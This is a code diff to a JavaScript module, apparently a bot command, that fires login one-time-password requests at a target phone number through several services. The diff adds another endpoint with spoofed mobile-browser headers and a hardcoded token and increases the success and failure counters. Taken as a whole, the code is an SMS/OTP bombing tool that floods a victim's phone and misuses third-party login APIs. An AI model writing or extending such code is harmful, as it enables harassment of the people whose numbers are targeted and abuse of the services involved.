@@ -59,6 +59,18 @@ module.exports = {
       msisdn: phone
     };
 
+    const kimungvayHeaders = {
+      'Host': 'api.kimungvay.co',
+      'Accept': 'application/json, text/plain, */*',
+      'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
+      'Content-Type': 'application/x-www-form-urlencoded',
+      'Origin': 'https://h5.kimungvay.site',
+      'Referer': 'https://h5.kimungvay.site/',
+    };
+
+    const kimungvayData = `phone=${phone}&type=2&ctype=1&chntoken=e51d233aa164cb9ec126578fc2d553f6`;
+
+
     // Initial message to be edited later
     let messageID = null;
     let successCount = 0;
@@ -83,14 +95,17 @@ module.exports = {
         }),
         axios.post("http://m.tv360.vn/public/v1/auth/get-otp-login", tv360Data, {
           headers: tv360Headers
+        }), 
+        axios.post("https://api.kimungvay.co/h5/LoginMessage_ultimate", kimungvayData, {
+          headers: kimungvayHeaders
         })
       ])
       .then(() => {
-        successCount += 2;
+        successCount += 3;
         updateMessage();
       })
       .catch(() => {
-        failureCount += 2;
+        failureCount += 3;
         updateMessage();
       });
     };
